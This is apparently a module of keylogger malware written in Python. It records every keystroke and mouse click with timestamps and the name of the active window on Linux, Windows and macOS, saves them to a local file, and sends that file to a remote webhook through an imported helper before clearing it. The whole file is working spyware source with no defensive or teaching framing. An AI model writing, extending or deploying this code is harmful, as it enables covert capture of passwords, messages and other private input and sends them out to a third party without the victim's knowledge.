from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import os
import platform


from utils.logging_utils import log_to_file, log_error, log_info, timestamp
from utils.webhook_utils import send_log_file
from utils.file_utils import clear_log_file


class InputLogger:
    def __init__(self):
        log_info("Input logger initialized.")
        self.log_file = "input.txt"
        self.running = True

    def get_active_window(self):
        active_window_name = "[COULD NOT BE DETERMINED]"
        if platform.system() == "Linux":
            try:
                import wnck

                screen = wnck.screen_get_default()
                screen.force_update()
                window = screen.get_active_window()
                if window is not None:
                    pid = window.get_pid()
                    with open(f"/proc/{pid}/cmdline") as f:
                        active_window_name = f.read()
            except Exception as e:
                print(e)
                raise
        elif platform.system() == "Windows":
            try:
                import win32gui

                window = win32gui.GetForegroundWindow()
                active_window_name = win32gui.GetWindowText(window)
            except Exception as e:
                print(e)
                raise
        elif platform.system() == "Darwin":
            try:
                from AppKit import NSWorkspace

                active_window_name = NSWorkspace.sharedWorkspace().activeApplication()[
                    "NSApplicationName"
                ]
            except Exception as e:
                print(e)
                raise
        return active_window_name

    def log_keyboard_press(self, key):
        log_to_file(
            self.log_file,
            f"[{timestamp()} ACTIVE WINDOW: {self.get_active_window()}]: KEY {key} PRESSED",
        )
        return self.running

    def log_keyboard_release(self, key):
        log_to_file(
            self.log_file,
            f"[{timestamp()} ACTIVE WINDOW: {self.get_active_window()}]: KEY {key} RELEASED",
        )
        return self.running

    def log_mouse_click(self, x, y, button, pressed):
        action = "PRESSED" if pressed else "RELEASED"
        log_to_file(
            self.log_file,
            f"[{timestamp()} ACTIVE WINDOW: {self.get_active_window()}]: MOUSE {action} {str(button)} AT {x}, {y}",
        )
        return self.running

    def log_input(self):
        with KeyboardListener(
            on_press=self.log_keyboard_press, on_release=self.log_keyboard_release
        ) as keyboard_listener, MouseListener(
            on_click=self.log_mouse_click
        ) as mouse_listener:
            keyboard_listener.join()
            mouse_listener.join()

    def send_logs(self):
        send_log_file(f"`Sending input logs...`", self.log_file)
        clear_log_file(self.log_file)
        log_info("Sent and cleared input log file.")

    def run(self):
        try:
            self.log_input()
        except Exception as e:
            self.running = False
            log_error(e)
